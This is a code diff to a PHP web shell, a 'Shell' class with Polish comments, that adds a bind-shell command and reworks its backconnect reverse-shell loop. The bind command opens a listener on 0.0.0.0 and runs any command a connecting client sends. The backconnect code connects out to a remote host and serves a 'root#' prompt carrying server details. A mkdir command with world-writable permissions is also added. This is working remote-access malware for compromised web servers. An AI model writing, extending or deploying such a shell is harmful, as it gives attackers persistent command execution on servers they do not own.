@@ -20,8 +20,6 @@ require_once __DIR__ . '/Html.php';
  * @todo
  *      MysqlDumper - oparty na poleceniu systemowym mysqldump oraz bibliotece PHP MysqlDumper
  *      Edycja pliku
- *      Tworzenie katalogow
- *      Binder
  *      Inne przydatne dziwactwa, ktore sie przydadza
  *
  * @uses       Request
@@ -158,7 +156,7 @@ class Shell
 		 */
 		$sPhpInfo = <<<CONTENT
 
-//phpinfo
+/phpinfo
 CONTENT;
 
 		$this -> sPhpInfo = substr( $sPhpInfo, -7 );
@@ -171,14 +169,14 @@ CONTENT;
 			ini_set( 'max_execution_time', 0 );
 			ini_set( 'memory_limit', '1024M' );
 			ini_set( 'display_errors', 0 );
-			ini_set( 'default_socket_timeout', 5 );
+			//ini_set( 'default_socket_timeout', 5 );
 		}
 
 		/**
 		 * Config
 		 */
 		ignore_user_abort( 1 );
-		error_reporting( 0 );
+		//error_reporting( 0 );
 
 		/**
 		 * disable_functions
@@ -308,6 +306,44 @@ HELP;
 	}
 
 	/**
+	 * Komenda - mkdir
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandMkdir()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+mkdir - Tworzenie katalogu
+
+	Użycie:
+		echo katalog [katalog2] [katalog3]
+HELP;
+		}
+
+		$sOutput = NULL;
+
+		for( $i = 0; $i < $this -> iArgc; $i++ )
+		{
+			if( ! mkdir( $this -> aArgv[ $i ], 0777  ) )
+			{
+				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został utworzony</span>\n", $this -> aArgv[ $i ] );
+			}
+			else
+			{
+				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"green\">został utworzony</span>\n", $this -> aArgv[ $i ] );
+			}
+		}
+
+		return $sOutput;
+	}
+
+	/**
 	 * Komenda - game
 	 *
 	 * @ignore
@@ -347,7 +383,7 @@ HELP;
 			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
 		}
 
-		$iLoop = ( isset( $this -> aArgv[1] ) ? (int) $this -> aArgv[1] : 5 );
+		$iLoop = ( isset( $this -> aArgv[1] ) ? (int) $this -> aArgv[1] : 10 );
 
 		$sOutput = NULL;
 
@@ -508,7 +544,7 @@ backconnect, bc - Połączenie zwrotne
 
 		komenda ":exit" zamyka połączenie
 
-		najlepiej uruchomić w nowym oklnie
+		najlepiej uruchomić w nowym oknie
 
 	Przykład:
 		backconnect localhost:6666
@@ -536,28 +572,140 @@ HELP;
 			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] );
 		}
 
-		fwrite( $rSock, $sTitle = sprintf( "Shell @ %s (%s)\r\n%s\r\nroot# ", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
+		fwrite( $rSock, $sTitle = sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
+
 		/**
 		 * BC
 		 */
 		for(;;)
 		{
-			$sCmd = rtrim( fread( $rSock, 1024 ) );
-			if( $sCmd === ':exit' )
+			if( ( $sCmd =  fread( $rSock, 1024 ) ) !== FALSE )
 			{
-				fwrite( $rSock, "\r\nbye ;)" );
-				exit ;
-			}
-			else if( empty( $sCmd ) )
-			{
-				continue ;
-			}
+				$sCmd = rtrim( $sCmd );
+				if( $sCmd === ':exit' )
+				{
+					fwrite( $rSock, "\r\nbye ;)" );
+					fclose( $rSock );
+					exit ;
+				}
 
-			fwrite( $rSock, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
-			fwrite( $rSock, "\r\nroot#" );
+				fwrite( $rSock, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
+				fwrite( $rSock, "\r\nroot#" );
+			}
+		}
+	}
+
+	/**
+	 * Komenda - bind
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandBind()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+bind - Dostęp do powłoki na danym porcie
+
+	Użycie:
+		bind port
+
+		komenda ":exit" zamyka połączenie
+
+		najlepiej uruchomić w nowym oknie
+
+	Przykład:
+		backconnect 6666
+
+	NetCat:
+		nc host 6666
+HELP;
 		}
 
-		exit ;
+		/**
+		 * Rozszerzenie "sockets" jes wymagane
+		 */
+		if( ! function_exists( 'socket_create' ) )
+		{
+			return 'Brak rozszerzenia "sockets"';
+		}
+
+		/**
+		 * Sprawdzanie poprawnosci portu
+		 */
+		if( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65535 ) )
+		{
+			return sprintf( 'Błędny port "%d"', $this -> aArgv[0] );
+		}
+
+		/**
+		 * Tworzenie socketa
+		 */
+		if( ( $rSock = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp ' ) ) ) === FALSE )
+		{
+			return 'Nie można utworzyć połączenia';
+		}
+
+		/**
+		 * Bindowanie
+		 */
+		if( ( socket_bind( $rSock, '0.0.0.0', $this -> aArgv[0] ) ) === FALSE )
+		{
+			return sprintf( 'Nie można zbindować "0.0.0.0:%d"', $this -> aArgv[0] );
+		}
+
+		if( ( socket_listen( $rSock ) ) === FALSE )
+		{
+			return sprintf( 'Nie można nasłuchiwać "0.0.0.0:%d"', $this -> aArgv[0] );
+		}
+
+		$bConnected = FALSE;
+
+		/**
+		 * bind
+		 */
+		for(;;)
+		{
+			/**
+			 * Klient
+			 */
+			if( ! $rClient && ! ( $rClient = socket_accept( $rSock ) ) )
+			{
+				usleep( 2000 );
+			}
+			else
+			{
+				/**
+				 * Naglowek
+				 */
+				if( ! $bConnected )
+				{
+					socket_write( $rClient, sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
+					$bConnected = TRUE;
+				}
+
+				/**
+				 * Komenda
+				 */
+				if( ( $sCmd = rtrim( socket_read( $rClient, 1024 ) ) ) !== FALSE )
+				{
+					if( $sCmd === ':exit' )
+					{
+						socket_write( $rClient, "\r\nbye ;)" );
+						socket_close( $rSock );
+						socket_close( $rClient );
+						exit ;
+					}
+
+					socket_write( $rClient, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
+					socket_write( $rClient, "\r\nroot#" );
+				}
+			}
+		}
 	}
 
 	/**
@@ -1423,8 +1571,14 @@ HELP;
 			 */
 			switch( $this -> sCmd )
 			{
+				case 'mkdir':
+					$sConsole = $this -> getCommandMkdir();
+					break ;
 				case 'echo':
 					$sConsole = $this -> getCommandEcho();
+					break ;
+				case 'bind':
+					$sConsole = $this -> getCommandBind();
 					break ;
 				case 'backconnect':
 				case 'bc':
